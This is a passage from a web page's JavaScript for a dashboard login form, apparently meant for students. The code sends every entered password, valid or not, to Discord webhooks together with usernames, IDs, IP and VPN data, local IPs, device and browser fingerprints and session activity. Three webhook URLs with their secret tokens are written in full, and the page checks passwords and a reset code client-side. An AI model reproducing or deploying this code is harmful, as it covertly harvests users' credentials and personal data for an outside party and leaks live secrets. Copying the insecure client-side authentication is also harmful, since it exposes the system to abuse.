            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or ID incorrect.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard and hide login
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body';
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;

        // Update global current user context for dashboard logging
        dashboard.currentUser.name = user.name || user.username;
        dashboard.currentUser.username = user.username;
        dashboard.currentUser.userID = userID;
        dashboard.currentUser.role = user.role || 'Student'; // Default role if not specified

        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "üîî Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "‚úÖ Reset Code Accepted" : "‚ùå Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
        } else {
          alert('Incorrect reset code.');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
